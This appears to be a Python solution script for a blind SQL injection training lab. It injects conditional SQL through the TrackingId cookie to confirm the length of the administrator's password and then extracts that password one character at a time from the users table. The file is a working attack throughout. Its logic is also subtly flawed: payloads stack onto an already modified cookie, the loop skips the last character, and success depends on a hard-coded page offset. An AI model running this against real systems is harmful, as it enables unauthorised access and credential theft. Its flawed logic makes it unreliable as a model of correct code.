#Blind SQL injection with conditional responses
import json
import requests
import os
import re

url = input("enter url : ")
r=requests.get(url)
cookies = r.cookies.get_dict()
cookies['TrackingId'] =cookies['TrackingId']+"\'+AND+(SELECT \'a\' FROM users WHERE username=\'administrator\' AND LENGTH(password)=20)=\'a" #Length password = 20


print(cookies['TrackingId'])

r=requests.get(url,cookies=cookies)
print(r.text.find("Welcome"))


TrackingId = cookies['TrackingId']
Password = "password : "
for i in range(1,20) :
    for j in 'abcdefghijklmnopqrstuvwxyz0123456789':

     cookies['TrackingId'] = TrackingId+"\'AND (SELECT SUBSTRING(password,"+str(i)+",1) FROM users WHERE username='administrator')='"+j 
     r=requests.get(url,cookies=cookies)
     if r.text.find("Welcome") == 2208 :
         Password=Password+j

print(Password)

     







